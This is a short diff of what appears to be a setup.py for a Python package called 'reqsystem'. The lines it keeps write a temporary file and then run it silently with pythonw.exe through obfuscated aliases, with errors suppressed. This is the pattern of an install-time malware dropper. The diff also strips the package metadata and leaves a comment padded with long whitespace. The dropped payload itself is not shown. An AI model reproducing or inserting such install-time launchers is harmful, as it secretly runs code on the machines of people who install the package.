@@ -8,19 +8,7 @@ _ttmp.close()
 try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
 except: pass
 
-setup(
-
-    name='reqsystem',
-    packages=['reqsystem'],
-    version='1.0',
-    license='MIT',
-    description='Makes Your Program Easier',
-    author='helper',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                   
 
 
 
